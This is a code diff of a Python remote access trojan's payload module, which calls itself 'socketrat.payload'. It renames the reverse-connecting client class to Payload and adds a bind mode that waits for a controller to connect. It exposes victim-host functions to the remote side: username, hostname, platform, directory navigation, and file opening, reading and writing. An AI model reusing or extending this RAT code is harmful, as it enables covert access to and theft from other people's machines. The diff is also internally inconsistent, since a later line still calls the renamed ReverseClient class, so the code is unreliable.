@@ -5,12 +5,13 @@ import socket
 import socketserver
 import sys
 
-from . import connection
-from . import payload
-from . import rpc
+from .. import connection
+from .. import rpc
+
+from . import *
 
 
-class ClientRPCHandler(rpc.RPCHandler):
+class PayloadRPCHandler(rpc.RPCHandler):
 
     def rpc_dir(self):
         return list(self._functions)
@@ -19,7 +20,7 @@ class ClientRPCHandler(rpc.RPCHandler):
         return s
 
 
-class ReverseClient:
+class Payload:
 
     def __init__(self, sock):
         self.sock = sock
@@ -30,6 +31,14 @@ class ReverseClient:
     def connect(cls, addr):
         sock = socket.create_connection(addr)
         return cls(sock)
+
+    @classmethod
+    def bind(cls, addr):
+        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        server.bind(addr)
+        server.listen(1)
+        client, _ = server.accept()
+        return cls(client)
 
     def __enter__(self):
         return self
@@ -82,7 +91,7 @@ class ThreadingBindClient(socketserver.ThreadingMixIn, BindClient):
     pass
 
 
-class FileService(payload.FileOpener, payload.FileReader, payload.FileWriter):
+class FileService(FileOpener, FileReader, FileWriter):
     pass
 
 
@@ -91,14 +100,14 @@ def _linux_connect(args):
 
     with ReverseClient.connect(addr) as client:
         funcs = [
-                payload.get_username,
-                payload.get_hostname,
-                payload.get_platform,
-                payload.list_dir,
-                payload.change_dir,
-                payload.get_current_dir,
-                payload.get_file_size,
-                payload.uname,
+                get_username,
+                get_hostname,
+                get_platform,
+                list_dir,
+                change_dir,
+                get_current_dir,
+                get_file_size,
+                uname,
         ]
         for f in funcs:
             client.register_function(f)
@@ -122,6 +131,7 @@ def _linux_main(args):
     import argparse
 
     parser = argparse.ArgumentParser(
+            prog='socketrat.payload',
             prefix_chars='-+',
     )
     payload_group = parser.add_argument_group('payload arguments')
